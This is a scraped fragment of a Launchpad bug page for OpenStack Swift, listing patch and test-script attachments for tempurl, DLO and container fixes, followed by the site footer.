* [acoles-combined-tempurl-xlo-fixes.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439721/%2Bfiles/acoles-combined-tempurl-xlo-fixes.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439721 "Change patch details")
* [acoles-tempurl-dlo-functest-mod.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439888/%2Bfiles/acoles-tempurl-dlo-functest-mod.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439888 "Change patch details")
* [clays-56-with-fixes.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439955/%2Bfiles/clays-56-with-fixes.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439955 "Change patch details")
* [tempurl-torgomatic-patch3.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439989/%2Bfiles/tempurl-torgomatic-patch3.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439989 "Change patch details")
* [container-tempurl.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4440490/%2Bfiles/container-tempurl.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4440490 "Change patch details")
* [tempurl-torgomatic-patch4.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4440773/%2Bfiles/tempurl-torgomatic-patch4.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4440773 "Change patch details")
* [tempurl-torgomatic-patch5.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442299/%2Bfiles/tempurl-torgomatic-patch5.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442299 "Change patch details")
* [tempurl-torgomatic-patch5.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442300/%2Bfiles/tempurl-torgomatic-patch5.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442300 "Change patch details")
* [tempurl-torgomatic-patch6.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442310/%2Bfiles/tempurl-torgomatic-patch6.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442310 "Change patch details")
* [tempurl-torgomatic-patch7.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442462/%2Bfiles/tempurl-torgomatic-patch7.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442462 "Change patch details")
* [tempurl-acoles-patch8.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442888/%2Bfiles/tempurl-acoles-patch8.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442888 "Change patch details")
* [tempurl-acoles-patch9.diff](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4442926/%2Bfiles/tempurl-acoles-patch9.diff)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4442926 "Change patch details")
* [kilo-tempurl-bp-combined.patch](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4446467/%2Bfiles/kilo-tempurl-bp-combined.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4446467 "Change patch details")
* [combined dlo & container tempurl fixes for master (ef8f14f)](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4449743/%2Bfiles/master-tempurl-combined.patch)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4449743 "Change patch details")

* [Add patch](/swift/%2Bbug/1449212/%2Baddcomment?field.patch=on)

## Bug attachments

* [test\_patch.sh](https://bugs.launchpad.net/swift/%2Bbug/1449212/%2Battachment/4439846/%2Bfiles/test_patch.sh)
  [Edit](/swift/%2Bbug/1449212/%2Battachment/4439846 "Change attachment details")

* [Add attachment](/swift/%2Bbug/1449212/%2Baddcomment)

## Remote bug watches

Bug watches keep track of this bug in other bug trackers.

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))



=== Content from review.openstack.org_ef7daef6_20250126_062824.html ===



